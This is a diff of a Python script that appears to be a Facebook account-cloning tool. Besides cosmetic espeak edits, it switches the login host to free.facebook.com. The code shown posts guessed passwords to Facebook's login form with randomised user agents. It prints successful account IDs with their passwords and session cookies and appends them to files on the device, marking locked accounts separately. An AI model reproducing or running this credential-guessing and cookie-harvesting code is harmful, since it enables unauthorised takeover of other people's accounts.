@@ -51,7 +51,7 @@ for ua in range(5000):
     l='.0'
     uaku2=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
     ugen.append(uaku2)
-os.system("espeak \"well come,to the monster  Bangladesh Random Cloning Start Please Wait\"")
+os.system("espeak  \"well come,to the monster  Bangladesh Random Cloning Start Please Wait\"")
 logo=(f"""
 '\x1b[38;5;46m' ░░░░░██╗██╗██████╗░░█████╗░███╗░░██╗
 '\x1b[38;5;47m' ░░░░░██║██║██╔══██╗██╔══██╗████╗░██║
@@ -150,7 +150,7 @@ def rcrack(uid,pwx,tl):
             "pass":ps,
             "login":"Log In"}
             header_mfb= {
-    'authority': 'mbasic.facebook.com',
+    'authority': 'free.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-GB,en;q=0.9,ur-IN;q=0.8,ur;q=0.7,bn-BD;q=0.6,bn;q=0.5,en-US;q=0.4',
     'cache-control': 'max-age=0',
@@ -176,7 +176,7 @@ def rcrack(uid,pwx,tl):
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
                 print(f"\033[1;33m[HASAN-OK🥰] {uid} • {ps}" '  \n\033[1;33m [🍁]\033[1;33mCookie = \033[1;32m'+coki+  ' \n\033[1;33m [😜] \033[1;32mUa = \033[1;34m'+pro+'  \033[0;97m')
-                os.system("espeak \"HASAN, OK, ID \"")
+                os.system("espeak  \"HASAN, OK, ID \"")
                 open('/sdcard/HASAN-OK🥰.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(uid)
                 break
@@ -184,7 +184,7 @@ def rcrack(uid,pwx,tl):
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[82:97]
                 print(f"\033[1;32m[Jibon-CP😔] \033[1;31m{uid} • {ps}")
-                os.system("espeak \"Jibon, CP, ID \"")
+                os.system("espeak  \"Jibon, CP, ID \"")
                 open('/sdcard/Jibon-CP😔.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(uid)
                 break
